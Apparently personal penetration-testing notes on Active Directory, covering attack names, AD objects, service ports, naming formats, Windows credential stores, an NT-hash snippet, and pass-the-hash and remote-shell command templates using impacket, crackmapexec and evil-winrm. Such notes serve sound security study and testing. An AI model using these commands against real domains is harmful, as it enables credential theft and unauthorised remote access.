# AD Info
Passwords in SYSVOL also known as GPP Passwords
LLMNR/NBNS Poisoning
	Reponder
SMB Relay attack
Passwords in user description
IPv6 DNS Takeover Attacks
Token Impersonation
Credential Dumping with Mimikatz
Weaponized LNK
mimikatz
local powershell
local/remote

AD Users and Computers:
* Objects
	* User account
		* Domain user account
		* Local user account
	* Computer account
	* Groups
		* Security Group
		* Distribution Group
	* Shares
	* Printers
	* Organizational Units (OU)
	* Attributes
	* Delegate Control

Service account:
* Managed service account (MSA)
	* sMSA
	* gMSA
* Computer account
* User account
	* Domain user account
	* Local user account

## Common services used in AD
|Service|port|
|-|-|
|DNS|53|
|Kerberos, kpasswd|88,464|
|RPC, RPC over HTTP|135, 593| 
|NetBIOS|137, 138, 139|
|LDAP, tls|389, 636|
|SMB|445|
|Global catalog LDAP, tls|3268, 3269|

## Domain Naming
#### Down-level logon name
* NetBIOS_domain_name/samAccountName
* legacy systems - backwards compatible - used for local signon
* 20 chars long

#### User Principal Name (UPN)
* userPrincipalName@DNS_domain_name
* Useful in multi-domain 
* Reflects email style

http://blog.schertz.name/2012/08/understanding-active-directory-naming-formats/

*User account naming:*
* userPrincipalName
* sAMAccountName

*Domain & computers naming:*
* NetBIOS name
* DNS name

#### Naming Conventions
firstlast
first.last
flast
f.last
firlas
fir.las


## Windows credentials
SAM: password hashes local account - pass the hash - NTLM
	encrypted with SYSTEM bootkey
SECURITY: cached domain credentials - logged on host
SYSTEM: LSA secrets
NTDS.DIT: user hashes on stored on DC
	DRSUAPI or VSS
	Kerberos keys
LSASS process from memory: clear-text passwords from logged on users, kerberos tickets

Credential Manager
Protected Storage

#### NTLM/NT hash
Windows hash consists of: LM:NTLM
LM (LAN Manager): 2 parts DES. Stored for backward compatibility reasons. No longer need it
NTLM (NT LAN Manager)/NT: MD4 hash

#### Calculate NTLM/NT hash
```Python
import hashlib,binascii
print(binascii.hexlify(hashlib.new('md4', "<PASSWORD>".encode('utf-16le')).digest()))
```

## Exploitation
Check:
`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H

Shell:
`impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
`impacket-psexec -hashes '<HASH>' <USER>@<IP>`
`evil-winrm -i <IP> -u <USER> -p '<PASS>'` hash: -H
`python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass`
`psexec.py -k -no-pass -dc-ip <IP> AD/administrator@192.168.1.100`
smbexec.py
wmiexec.py

## Post-exploitation
`Bloodhound`
	`SharpHound` for local AD
	`AzureHound` for Azure AD